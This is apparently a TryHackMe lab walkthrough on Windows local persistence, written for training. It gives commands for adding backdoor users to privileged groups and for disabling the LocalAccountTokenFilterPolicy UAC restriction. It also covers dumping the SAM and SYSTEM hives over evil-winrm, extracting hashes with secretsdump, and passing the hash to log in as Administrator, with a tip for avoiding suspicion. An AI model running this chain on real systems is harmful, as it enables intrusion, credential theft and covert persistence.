# Windows Local Persistence

**Room Link:** [https://tryhackme.com/room/windowslocalpersistence](https://tryhackme.com/room/windowslocalpersistence)



## Tampering With Unprivileged Accounts

### Assign Group Memberships

For this part of the task, we will assume you have dumped the password hashes of the victim machine and successfully cracked the passwords for the unprivileged accounts in use.

The direct way to make an unprivileged user gain administrative privileges is to make it part of the **Administrators** group. We can easily achieve this with the following command.

**Victim**

```
net localgroup administrators thmuser0 /add
```

This will allow you to access the server by using RDP, WinRM or any other remote administration service available.

If this looks too suspicious, you can use the **Backup Operators** group. Users in this group won't have administrative privileges but will be allowed to read/write any file or registry key on the system, ignoring any configured DACL. This would allow us to copy the content of the SAM and SYSTEM registry hives, which we can then use to recover the password hashes for all the users, enabling us to escalate to any administrative account trivially.

To do so, we begin by adding the account to the Backup Operators group.

**Victim**

```
net localgroup "Backup Operators" thmuser1 /add
```

Since this is an unprivileged account, it cannot RDP or WinRM back to the machine unless we add it to the **Remote Desktop Users** (RDP) or **Remote Management Users** (WinRM) groups. We'll use WinRM for this task.

**Victim**

```
net localgroup "Remote Management Users" thmuser1 /add
```

We'll assume we have already dumped the credentials on the server and have thmuser1's password. Let's connect via WinRM using its credentials. If you tried to connect right now from your attacker machine, you'd be surprised to see that even if you are on the Backups Operators group, you wouldn't be able to access all files as expected. A quick check on our assigned groups would indicate that we are a part of Backup Operators, but the group is disabled.

**Kali**

```
evil-winrm -i $VICTIM -u thmuser1 -p Password321
*Evil-WinRM* PS C:\Users\thmuser1\Documents> whoami /groups
```

<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

This is due to User Account Control (UAC). One of the features implemented by UAC, **LocalAccountTokenFilterPolicy**, strips any local account of its administrative privileges when logging in remotely. While you can elevate your privileges through UAC from a graphical user session (Read more on UAC [here](https://tryhackme.com/room/windowsfundamentals1xbx)), if you are using WinRM, you are confined to a limited access token with no administrative privileges.

To be able to regain administration privileges from your user, we'll have to disable LocalAccountTokenFilterPolicy by changing the following registry key to 1.

**Victim**

```
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1
```

Once all of this has been set up, we are ready to use our backdoor user. First, let's establish a WinRM connection and check that the Backup Operators group is enabled for our user:

**Kali**

```
evil-winrm -i $VICTIM -u thmuser1 -p Password321
*Evil-WinRM* PS C:\Users\thmuser1\Documents> whoami /groups
```

<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

\----

We then proceed to make a backup of SAM and SYSTEM files and download them to our attacker machine.

**Kali(WinRM)**

```
reg save hklm\system system.bak
reg save hklm\sam sam.bak
download system.bak
download sam.bak
```

With those files, we can dump the password hashes for all users using `secretsdump.py` or other similar tools.

**Kali**

```
python3.9 /opt/impacket/examples/secretsdump.py -sam sam.bak -system system.bak LOCAL
```

And finally, perform Pass-the-Hash to connect to the victim machine with Administrator privileges.

**Kali**

```
evil-winrm -i $VICTIM -u Administrator -H 1cea1d7e8899f69e89088c4cb4bbdaa3
```

### Special Privileges and Security Descriptors
